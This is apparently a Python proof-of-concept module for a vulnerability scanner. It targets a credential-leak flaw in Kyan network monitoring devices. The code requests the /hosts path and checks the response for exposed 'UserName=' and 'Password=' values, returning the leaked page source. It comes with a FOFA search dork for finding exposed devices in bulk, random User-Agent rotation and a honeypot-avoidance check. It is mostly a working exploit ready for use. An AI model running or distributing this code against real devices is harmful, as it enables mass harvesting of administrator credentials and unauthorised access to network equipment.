# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase

# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "hansi & jijue",                      # POC作者
        "version" : "3",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-18",        # POC创建时间
        "UpdateDate" : "2021-06-18",        # POC创建时间
        "PocDesc" : """
        v2 原POC逻辑过于简单存在大量误报，现已优化  
        v3 v2有缺陷，再次优化
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "Kyan网络监控设备信息泄露",                        # 漏洞名称
        "VulnID" : "",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "",                     # 漏洞应用名称
        "AppVersion" : "无",                  # 漏洞应用版本
        "VulnDate" : "2021-03-10",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
        Kyan 网络监控设备 存在账号密码泄露漏洞，攻击者通过漏洞可以获得账号密码和后台权限
        """,                                # 漏洞简要描述

        "fofa-dork":"""
        title="platform - Login"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  

    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/hosts" # url自己按需调整


        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    # "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值，漏洞不存在则不动
            """
            req = requests.get(url,headers = headers , proxies = self.proxy , timeout = self.timeout,verify = False)
            if req.status_code == 200 and "UserName=" in req.text and "</html>" not in req.text and "Password=" in req.text:
                vuln = [True,req.text]
            else:
                vuln = [False,req.text]
        except Exception as e:
            raise e

        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln


    def _attack(self):
        return self._verify()